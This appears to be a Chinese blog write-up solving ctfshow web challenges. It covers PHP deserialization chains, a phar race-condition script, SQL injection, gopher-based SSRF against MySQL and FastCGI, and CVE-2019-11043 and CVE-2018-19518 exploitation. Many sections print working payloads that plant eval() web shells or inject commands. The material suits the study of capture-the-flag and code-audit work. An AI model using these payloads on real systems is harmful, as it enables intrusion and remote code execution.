<h3 id="web-265"><a href="#web-265" class="headerlink" title="web-265"></a>web-265</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfshowAdmin&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public $password;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;password=&amp;$this-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new ctfshowAdmin();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>不能控制随机数，我还不能控制值吗？简单的引用</p>
<h3 id="web-266"><a href="#web-266" class="headerlink" title="web-266"></a>web-266</h3><p>当我们的序列化字符串中有ctfshow就会抛出异常，这样就没办法调用__destrcut了，在php中，函数不区分大小写，所以大写绕过就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfshow&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = new ctfshow();</span><br><span class="line">echo (serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>这里得注意一下，php:&#x2F;&#x2F;input得在bp传。</strong> </p>
<p>解析出错，由于类名是正确的，就会调用该类名的<code>__destruct</code>，从而在throw前执行了<code>__destruct</code></p>
<p>O:7:”ctfshow”:2:{} </p>
<h3 id="web-267"><a href="#web-267" class="headerlink" title="web-267"></a>web-267</h3><p>弱口令admin，admin进入，看源码，发现about界面有提示。get传入view-source，发现回显。</p>
<p>&#x2F;&#x2F;&#x2F;backdoor&#x2F;shell<br>unserialize(base64_decode($_GET[‘code’]))</p>
<p>反序列化，我们看源码的时候可以看到引用js，是yii框架。</p>
<p>这里可以直接去网上找利用链。</p>
<h3 id="web-271"><a href="#web-271" class="headerlink" title="web-271"></a>web-271</h3><p>laravel5.7反序列化漏洞</p>
<p>laravel5.8反序列化漏洞</p>
<p>thinkphp 5.1反序列化漏洞</p>
<p>都是一些漏洞的复现：<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110558192">https://blog.csdn.net/miuzzx/article/details/110558192</a></p>
<p>因为漏洞复现不在目前计划中，就先略过了。</p>
<h3 id="web-275"><a href="#web-275" class="headerlink" title="web-275"></a>web-275</h3><p>这里直接审计代码，linux可以允许system(‘rm’.$_GET[1]);动态执行，所以这里可以用分号来分隔命令。</p>
<p>&#x2F;?fn&#x3D;php;tac f*</p>
<h3 id="web-276"><a href="#web-276" class="headerlink" title="web-276"></a>web-276</h3><p>给出phar反序列化学习链接</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/205943.html">https://www.freebuf.com/articles/web/205943.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a></p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1732/">https://tttang.com/archive/1732/</a></p>
<p>在上个题的基础上增了了 判断$this-&gt;admin所以真的需要我们去通过反序列化修改admin的值了。因为题目中没有反序列化函数，所以需要通过其他方式。<br>因为题目中有写文件的函数，所以可以通过file_put_contents写phar文件，然后再通过file_put_contents触发phar反序列化。当然我们得在删除文件前执行完这两个操作，所以需要用到条件竞争。<br>生成phar文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class filter&#123;</span><br><span class="line">    public $filename = &quot;1|cat f*&quot;;</span><br><span class="line">    public $filecontent;</span><br><span class="line">    public $evilfile = true;</span><br><span class="line">    public $admin = true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$o = new filter();</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>条件竞争</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import base64</span><br><span class="line">url = &#x27;http://b1238473-a3bb-431f-a39e-3cd285bcb95e.chall.ctf.show/&#x27;</span><br><span class="line"></span><br><span class="line">f = open(&#x27;./phar.phar&#x27;, &#x27;rb&#x27;)</span><br><span class="line"></span><br><span class="line">data = f.read()</span><br><span class="line">flag = False</span><br><span class="line"></span><br><span class="line">def work1():</span><br><span class="line">    requests.post(url+&quot;?fn=a&quot;, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def work2():</span><br><span class="line">    global flag</span><br><span class="line">    r = requests.post(url+&quot;?fn=phar://phar.phar/&quot;, data=&quot;&quot;)</span><br><span class="line">    if &quot;flag&#123;&quot; in r.text and flag is False:</span><br><span class="line">        print(base64.b64encode(r.text.encode()))</span><br><span class="line">        flag = True</span><br><span class="line"></span><br><span class="line">while flag is False:</span><br><span class="line">    a = threading.Thread(target=work1)</span><br><span class="line">    b = threading.Thread(target=work2)</span><br><span class="line">    a.start()</span><br><span class="line">    b.start()</span><br></pre></td></tr></table></figure>

<h3 id="web-277"><a href="#web-277" class="headerlink" title="web-277"></a>web-277</h3><p>python pickle反序列化</p>
<h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着非常大的变化，但是相对于WebWork，Struts 2的变化很小。<br><em><strong>直接拿别人的工具一把梭</strong></em></p>
<p>emmmmmmmm，这种事我就不做了，没什么参考价值。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/111270213">https://blog.csdn.net/miuzzx/article/details/111270213</a></p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>嗝，代码审计。。。。。。听名字就知道不好惹。白盒测试的重要性不言而喻。</p>
<h3 id="web-301"><a href="#web-301" class="headerlink" title="web-301"></a>web-301</h3><p>seay扫一遍。好家伙，什么都没有。我也没装昆仑镜那些其他的。慢慢看吧。</p>
<p>先看login.php，普通的登录界面，创建了session。</p>
<p>再看checklogin.php，直接采用变量拼接，没有过滤。可能存在SQL注入。</p>
<p>我们再看下面的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(!strcasecmp($userpwd,$row[&#x27;sds_password&#x27;]))&#123;</span><br><span class="line">	$_SESSION[&#x27;login&#x27;]=1;</span><br><span class="line">	$result-&gt;free();</span><br><span class="line">	$mysqli-&gt;close();</span><br><span class="line">	header(&quot;location:index.php&quot;);</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>strcasecmp(str1,str2)</code>：比较字符串<br>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；<strong>如果两者相等，返回 0。</strong></p>
</blockquote>
<p>这里的登录判断就是执行结果等于我们输入的密码。</p>
<p>直接构造就行：<code>-1&#39; union select 1 from sds_user--+</code>        <code>userpwd=1</code></p>
<p>用sqlmap跑也行，随你。</p>
<h3 id="web-302"><a href="#web-302" class="headerlink" title="web-302"></a>web-302</h3><p>修改的地方：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!strcasecmp(sds_decode($userpwd),$row[&#x27;sds_password&#x27;]))&#123;</span><br></pre></td></tr></table></figure>

<p>对userpwd做了一个解码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function sds_decode($str)&#123;</span><br><span class="line">	return md5(md5($str.md5(base64_encode(&quot;sds&quot;))).&quot;sds&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fun.php里面有编码的方式，直接编码就行。</p>
<p>简单说一下：密码是加密形式存在数据库里面的，所以把加密后的数据取出来</p>
<p><code>userid=1&#39; union select &#39;d9c77c4e454869d5d8da3b4be79694d3&#39;#&amp;userpwd=1</code></p>
<p>直接写一句话木马：userid&#x3D;a ‘ union select “<?php eval($_POST[1]);?>“ into outfile “&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php”%23&amp;userpwd&#x3D;b</p>
<h3 id="web-303"><a href="#web-303" class="headerlink" title="web-303"></a>web-303</h3><p>嗝~扫出来dptadd.php可能有SQL注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;insert into sds_dpt set sds_name=&#x27;&quot;.$dpt_name.&quot;&#x27;,sds_address =&#x27;&quot;.$dpt_address.&quot;&#x27;,sds_build_date=&#x27;&quot;.$dpt_build_year.&quot;&#x27;,sds_have_safe_card=&#x27;&quot;.$dpt_has_cert.&quot;&#x27;,sds_safe_card_num=&#x27;&quot;.$dpt_cert_number.&quot;&#x27;,sds_telephone=&#x27;&quot;.$dpt_telephone_number.&quot;&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>是个插入。可能需要登录后才能利用，sds_user.sql给出了账号密码，加密的密码可以倒推一下。admin</p>
<p>进去后有个新增的界面，直接注就行了。</p>
<h3 id="web-305"><a href="#web-305" class="headerlink" title="web-305"></a>web-305</h3><p>扫描是给了两个，一个dptadd.php的SQL注入，另外一个是class.php的文件上传。</p>
<p>跟进分析发现在fun.php中有waf，而且username的长度也做了限制，基本上是没法注的。</p>
<p>接着看class user，有一说一</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()&#123;</span><br><span class="line">	file_put_contents($this-&gt;username, $this-&gt;password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数可控，理论上来说是可以的。在checklogin中有cookie的反序列化，那么就来了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">	public $username;</span><br><span class="line">	public $password;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;username=&quot;1.php&quot;;</span><br><span class="line">		$this-&gt;password=&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new user();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>蚁剑连接，去数据库里面查就行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1=include &quot;conn.php&quot;;</span><br><span class="line">$sql=&quot;select group_concat(flag) from sds_flabag &quot;; //MySQL代码</span><br><span class="line">$result=$mysqli-&gt;query($sql);</span><br><span class="line">$row=$result-&gt;fetch_array(MYSQLI_BOTH);</span><br><span class="line">print_r($row);</span><br></pre></td></tr></table></figure>

<h3 id="web-306"><a href="#web-306" class="headerlink" title="web-306"></a>web-306</h3><p> 扫出来和上题目一样，但是class中的析构换成close()了，全局搜索一下close()发现在dao.php中class dao有析构函数是调用close()，这应该就是我们需要找的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class dao&#123;</span><br><span class="line">	private $config;</span><br><span class="line">	private $conn;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;conn=new log();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class log&#123;</span><br><span class="line">	public $title=&#x27;1.php&#x27;;</span><br><span class="line">	public $info=&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-307"><a href="#web-307" class="headerlink" title="web-307"></a>web-307</h3><p>扫一遍，发现calss.php文件包含，但是写死了，没有地方能调。</p>
<p>接下来看dao.php中有一个命令执行函数shell_exec，但是需要调clearCache，全局搜索发现service.php中的service类可以调它，然后呢？？？嗝，没了。看看反序列化的函数在哪吧，logout有一个，login有一个，但是loginout可以执行clearCache，不错。链已经差不多了，最后看看怎么控制$this-&gt;config-&gt;cache_dir，在dao类的构造函数是新生成了一个config类，我们可以直接控制cache_dir。至此，就分析完了？</p>
<p>等等，我们执行logout？？？我们还没登录怎么执行logout。。。。。。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($user)&#123;</span><br><span class="line">	header(&quot;location:index.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>嗯，有这个那就没事了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class config&#123;</span><br><span class="line">    public $cache_dir = &#x27;aaa/*;cat /var/www/html/flag.php &gt; /var/www/html/1.txt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class dao</span><br><span class="line">&#123;</span><br><span class="line">    private $config;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;config = new config();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode(serialize(new dao()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-308"><a href="#web-308" class="headerlink" title="web-308"></a>web-308</h3><p>增加了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function  clearCache()&#123;</span><br><span class="line">		if(preg_match(&#x27;/^[a-z]+$/i&#x27;, $this-&gt;config-&gt;cache_dir))&#123;</span><br><span class="line">			shell_exec(&#x27;rm -rf ./&#x27;.$this-&gt;config-&gt;cache_dir.&#x27;/*&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>在审dao.php的时候发现多了一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function checkVersion()&#123;</span><br><span class="line">		return checkUpdate($this-&gt;config-&gt;update_url);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>跟进，发现在fun.php中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function checkUpdate($url)&#123;</span><br><span class="line">		$ch=curl_init();</span><br><span class="line">		curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">		curl_setopt($ch, CURLOPT_HEADER, false);</span><br><span class="line">		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);</span><br><span class="line">		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);</span><br><span class="line">		$res = curl_exec($ch);</span><br><span class="line">		curl_close($ch);</span><br><span class="line">		return $res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>眼熟？嗯，是个SSRF。index能直接调，OK。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dao&#123;</span><br><span class="line">	private $config;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">	$this-&gt;config=new config();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class config&#123;</span><br><span class="line"> 	public $update_url = &#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%44%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d= new dao();</span><br><span class="line">echo base64_encode(serialize($d));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>别告诉我，你gopherus不会用。</p>
<h3 id="web-309"><a href="#web-309" class="headerlink" title="web-309"></a>web-309</h3><p>你说说，mysql做了防护，还能打什么？？？不是redis就是fastcgi。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_SESSION[&#x27;login&#x27;]))&#123;</span><br><span class="line">header(&quot;location:login.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>别忘了登录，大笨蛋。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class config&#123;</span><br><span class="line">	public $update_url = &#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27cat%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class dao&#123;</span><br><span class="line">	private $config;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;config=new config();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web-310"><a href="#web-310" class="headerlink" title="web-310"></a>web-310</h3><p>源码已经没用了，不过问题不大，gopher还可以读文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dao&#123;</span><br><span class="line">	private $config;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">	$this-&gt;config=new config();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class config&#123;</span><br><span class="line"> 	public $update_url = &#x27;file:///etc/nginx/nginx.conf&#x27;;&#125;</span><br><span class="line"></span><br><span class="line">$d= new dao();</span><br><span class="line">echo base64_encode(serialize($d));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">       listen       4476;</span><br><span class="line">       server_name  localhost;</span><br><span class="line">       root         /var/flag;</span><br><span class="line">       index index.html;</span><br><span class="line"></span><br><span class="line">       proxy_set_header Host $host;</span><br><span class="line">       proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dao&#123;</span><br><span class="line">	private $config;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">	$this-&gt;config=new config();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class config&#123;</span><br><span class="line"> 	public $update_url = &#x27;http://127.0.0.1:4476&#x27;;&#125;</span><br><span class="line"></span><br><span class="line">$d= new dao();</span><br><span class="line">echo base64_encode(serialize($d));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>至此，ctfshow代码审计部分完成。不过都是比较简单的点，只能说告诉你代码审计是啥。在一个完整的项目中，要进行审计可不是那么简单的事情。那么，加油吧！</p>
<h2 id="phpCVE"><a href="#phpCVE" class="headerlink" title="phpCVE"></a>phpCVE</h2><h3 id="web-311"><a href="#web-311" class="headerlink" title="web-311"></a>web-311</h3><p>抓包，看见返回的头</p>
<p><code>HTTP/1.1 200 OK Date: Mon, 31 Oct 2022 05:58:45 GMT Content-Type: text/html; charset=UTF-8 Connection: close Server: nginx/1.18.0 (Ubuntu) X-Powered-By: PHP/7.1.33dev Content-Length: 28</code></p>
<p>百度找找PHP 7.1.33的洞：CVE-2019-11043 </p>
<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/neex/phuip-fpizdam.git</span><br><span class="line">cd phuip-fpizdam</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run . &quot;xxx/index.php&quot;</span><br></pre></td></tr></table></figure>

<p><code>/?a=ls</code>  我丢，解题网站的waf，这个复现不成功。之前应该是可以的。</p>
<h3 id="web-312"><a href="#web-312" class="headerlink" title="web-312"></a>web-312</h3><p>CVE-2018-19518</p>
<p>对自己想要发的内容进行一次base64编码</p>
<p>首先对<?php @eval($_POST[mumuzi]);?>进行一次base64编码</p>
<p>然后对echo “PD9waHAgQGV2YWwoJF9QT1NUW211bXV6aV0pOz8+” | base64 -d &gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;ma.php进行一次base64编码</p>
<p>得到ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzIxMWJYVjZhVjBwT3o4KyIgfCBiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvbWEucGhw</p>
<p>注意：如果进行base64编码后，含有+ &#x3D;，都要进行url编码即%2b %3d，所以为了保证不会出错，最好再对得到的base64编码后的字符串再进行url编码。相当于步骤为先base64编码，再url编码</p>
<p>然后将hostname的内容替换成x+-oProxyCommand%3decho%09编码后的内容|base64%09-d|sh}</p>
